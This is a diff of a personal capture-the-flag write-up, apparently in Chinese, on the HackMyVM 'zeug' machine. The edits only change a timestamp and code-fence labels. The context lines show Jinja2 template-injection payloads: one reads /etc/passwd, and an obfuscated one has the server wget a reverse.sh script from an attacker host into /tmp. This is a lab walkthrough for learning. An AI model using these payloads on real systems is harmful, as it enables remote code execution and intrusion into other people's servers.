@@ -3,7 +3,7 @@ title: zeug_hard
 tags:
   - sec/hackmyvm
 date: 2024-02-09T19:30:21
-lastmod: 2024-11-24T18:56:30
+lastmod: 2024-11-24T19:12:29
 toc: "true"
 ---
 netdiscover
@@ -24,7 +24,7 @@ netdiscover
 ## FTP 匿名登录
 ![HMM_zeug_image_8](https://img.l1uyun.one/HMM_zeug_image_8.png)
 
-```
+```bash
 ~/workspace cat README.txt
 Hi, Cosette, don't forget to disable the debug mode in the web application, we don't want security breaches.
 ```
@@ -55,7 +55,7 @@ Server Side Template Injection
 在 payloadallthing 里面找[能用的 payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2)
 2024-02-10-00:55:01
 明天晚上再看看
-```
+```bash
 # 我找到的是这个,能够读取文件,但是没用....
 {{get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
 
@@ -72,7 +72,7 @@ wp的payload,神奇的linsum
 ![HMM_zeug_image_15](https://img.l1uyun.one/HMM_zeug_image_15.png)
 
 
-```
+```bash
 cosette
 flask.app
 Flask
@@ -95,7 +95,7 @@ Flask
 
 去看 wp了
 
-```
+```bash
 {{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\"o"+"s\").po"+"pen(\"wget http://192.168.10.11:8000/reverse.sh -O /tmp/reverse.sh\").read()")}}
 
 
@@ -113,7 +113,7 @@ Flask
 
 ![HMM_zeug_image_26](https://img.l1uyun.one/HMM_zeug_image_26.png)
 
-```
+```bash
 strings  /usr/bin/zeug
 ```
 ![HMM_zeug_image_27](https://img.l1uyun.one/HMM_zeug_image_27.png)
